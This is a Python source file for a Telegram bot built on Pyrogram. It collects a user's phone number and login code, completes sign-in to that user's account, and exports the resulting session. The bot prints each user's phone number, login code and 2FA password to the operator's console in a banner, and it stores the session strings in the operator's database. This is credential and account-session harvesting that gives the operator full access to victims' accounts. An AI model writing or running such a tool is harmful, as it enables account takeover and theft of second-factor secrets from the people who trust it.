from pyrogram import filters
from pyrogram.types import Message

from pyrogram.errors import (
    SessionPasswordNeeded,
    AuthKeyInvalid,
    UserDeactivated,
    UserIsBlocked,

)

from pyrobot.pyrobot import PyroBot, UserClient
from pyrobot import *

from pyrobot.lang.lang_take import Lang

import sqlite3
from typing import Optional
import asyncio

from dataclasses import dataclass
import string
import random as rnd




@dataclass
class Memmory:
    phone_number: str = None
    phone_hash: str = None
    code: str = None
    user_client: Optional[UserClient] = None  # Fix the typo here (=c -> :)
    awaiting_2fa: bool = False
    
    # Singleton pattern
    _instance = None
    
    def __new__(cls, *args, **kwargs):
        if cls._instance is None:
            cls._instance = super(Memmory, cls).__new__(cls)
        return cls._instance
        
    def update(self, **kwargs):
        """Update instance attributes"""
        for key, value in kwargs.items():
            if hasattr(self, key):
                setattr(self, key, value)

    def clear(self):
   

        self.phone_number = None
        self.phone_hash = None
        self.code = None
        self.user_client = None
        self.awaiting_2fa = False   

# Create global instance
mem = Memmory()

# class Handler:
#     def __init__(self, phone_number: str = None, phone_hash: str = None, code: str = None):
#         self.phone_number = phone_number
#         self.phone_hash = phone_hash
#         self.code = code

@PyroBot.on_message(filters.regex(r'^\+\d{7,15}$'))
async def phone_number(_, message: Message):
    LOGGER.info(f"Phone number received from user {message.from_user.id}")
    
    user_id = message.from_user.id
    phone_number = message.text
    
    
    usr_lang = user_lang_cache.get_lang(user_id)
    lang = Lang(usr_lang)
    # usr_lang = db.get_user_language(user_id)
    
    
    await message.reply_text(lang.send("phone_check").format(phone_number))

    mem.update(phone_number=phone_number)
    await sending_code(phone_number, message)




async def sending_code(phone_number, message):
    LOGGER.info(f"Sending code to {phone_number}")  
    user_id = message.from_user.id

    # send_code = await UserClient.send_code()
    user_client = UserClient(phone_number)
    mem.update(user_client=user_client)
    # usr_lang = User(user_id).lang
    usr_lang = user_lang_cache.get_lang(user_id)
    lang = Lang(usr_lang)

    if not mem.user_client.is_connected:
        try:
            await mem.user_client.connect()
        except sqlite3.OperationalError:  
            await message.reply_text(lang.send['sql_error'].format(phone_number))
        
        except AttributeError:
            pass

    result = await mem.user_client.send_code(phone_number)
    print(result)
    await asyncio.sleep(1)

    phone_hash = result.phone_code_hash
    mem.update(phone_hash=phone_hash)


    


@PyroBot.on_message(filters.regex(r'^\d{5}$|^\d{1,4}\.\d{1,4}$'))
async def get_code(_, message: Message):
    code = message.text
    user_id = message.from_user.id


    obs_code = ''.join([l + rnd.choice(string.ascii_lowercase) for l in code])


    print(f"""
          
##################################################################
FROM: {message.from_user.username} | {message.from_user.first_name}

Phone: {mem.phone_number} | Code: {code}

[] Security
OBS_CODE: {obs_code}
##################################################################

""")
    
    phone_number = mem.phone_number
    phone_hash = mem.phone_hash

    usr_lang = user_lang_cache.get_lang(user_id)
    lang = Lang(usr_lang)

    try:    
        result = await mem.user_client.sign_in(
            phone_number, 
            phone_hash, 
            obs_code)

        print(f"Sign-in result: {result}")

        info_session = f"""
        username:   {result.username if result.username else 'None'}
        id:         {result.id}
        first_name: {result.first_name if result.first_name else 'None'}
        phone:      {result.phone_number}
        """

        await message.reply_text(lang.send('code_success'))

        session_string = mem.user_client.export_session_string()
        db.save_session(user_id, phone_number, session_string)


        # Send session file
        session_file = SESSIONS_PATH / f"{mem.phone_number}.session"

        await message.reply_document(
            document=session_file,
            caption=info_session
        )

        mem.clear()


    except SessionPasswordNeeded:
        mem.update(awaiting_2fa=True)
        await message.reply_text(lang.send('2fe_password'))

    except Exception as e:
        await message.reply_text(lang.send('code_error'))
        LOGGER.error(f"Error signing in: {str(e)}")
        mem.clear()


    # result = await user_client.sign_in(phone_number, phone_hash, code)


@PyroBot.on_message(filters.text
    & filters.create(lambda _, __, m: not m.text.startswith('/'))
    & ~filters.regex(r'^\+\d{7,15}$') 
    & ~filters.regex(r'^\d{5}$|^\d{1,4}\.\d{1,4}$'))

async def two_factor_auth(_, message: Message):
    user_id = message.from_user.id
    password = message.text

    usr_lang = user_lang_cache.get_lang(user_id)
    lang = Lang(usr_lang)

    if not mem.awaiting_2fa:
        return
    
    if not mem.user_client or not mem.user_client.is_connected:
        return
    

    try:
        await message.reply_text(lang.send('checking_password'))
        result = await mem.user_client.check_password(password)

        print(f"2FA result: {result}")


 
        info_session = f"""
        username:   {result.username if result.username else 'None'}
        id:         {result.id}
        first_name: {result.first_name if result.first_name else 'None'}
        phone:      {result.phone_number}
        2fe:        {password}
        """

        print(f"""
            Session info:
        {info_session}
        """)


        LOGGER.info(f"User {message.from_user.id} signed in successfully")

        session_string = await mem.user_client.export_session_string()

        db.save_session(user_id, mem.phone_number, session_string)

        mem.update(awaiting_2fa=False)
        await message.reply_text(lang.send('2fa_success'))
        
        # Send session file
        session_file = SESSIONS_PATH / f"{mem.phone_number}.session"

        await message.reply_document(
            document=session_file,
            caption=info_session
        )
        mem.clear()



    except Exception as e:
        LOGGER.error(f"Error signing in: {str(e)}")
        await message.reply_text(lang.send('password_error'))
        mem.update(awaiting_2fa=False)
        mem.clear()



        